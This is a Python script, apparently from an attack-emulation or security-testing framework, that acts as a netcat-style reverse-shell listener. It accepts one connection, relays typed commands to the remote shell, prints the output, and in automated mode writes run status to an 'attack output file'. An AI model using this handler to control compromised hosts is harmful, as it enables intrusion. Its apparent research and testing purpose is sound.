# Copyright (C) 2025 CEA - All Rights Reserved
# 
# This program is free software: you can redistribute it and/or modify it under
# the terms of the GNU General Public License as published by the Free Software
# Foundation, either version 3 of the License, or (at your option) any later
# version.
# 
# This program is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of  MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE. See the GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License along with
# this program.  If not, see <http://www.gnu.org/licenses/>.

import socket
import threading
import sys
import os
import json

if len(sys.argv) != 4:
    print("[!] Wrong number of parameters provided.")
    print("[!] Usage: python3 netcat.py <Port> <Automated Mode> <Attack Output File>")
    sys.exit(1)

# Configuration
HOST = '0.0.0.0'   
PORT = int(sys.argv[1])  
 
is_automated_mode = int(sys.argv[2])    
attack_output_file = sys.argv[3]

# Create the server socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Allows addresses and ports to be reused to avoid the “Address already in use” error during quick restarts.
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) 

server.bind((HOST, PORT))
server.listen(1)
print(f"[+] Server listening on {HOST}:{PORT}...")

client_socket, client_address = server.accept()
print(f"[+] Connection received from {client_address[0]}:{client_address[1]}")

def receive_shell_output(connection):
    while True:
        try:
            data=connection.recv(1024)
            print(data.decode(), end="", flush=True)
            if len(data) == 0:
                return 1
        except:
            print("[!] Connection lost. Exiting program...")
            return 1

def send_shell_input(connection):
    while True:
        try:
            command = input("")
            connection.send(command.encode() + b"\n")
        except:
            print("[!] Connection lost. Exiting program...")
            return 1

if is_automated_mode != 0:
# If running in automated mode, write execution status and process ID to the specified output file
    try:
        with open(attack_output_file, 'w') as output_file:
            attack_output = {"status": "complete-run", "netcat_pid": str(os.getpid())}
            json.dump(attack_output, output_file)
    except IOError as e:
        print(f"[!] Failed to write attack result to {attack_output_file}: {e}")

# Start receiver thread
receiver_thread = threading.Thread(target=receive_shell_output, args=[client_socket])
receiver_thread.daemon = True
receiver_thread.start()

# Start sender thread
sender_thread = threading.Thread(target=send_shell_input, args=[client_socket])
sender_thread.daemon = True
sender_thread.start()

try:
    receiver_thread.join()
except KeyboardInterrupt:
    print("\n[+] Closing the connection.")
    client_socket.send(b"exit\n")

client_socket.close()
server.close()


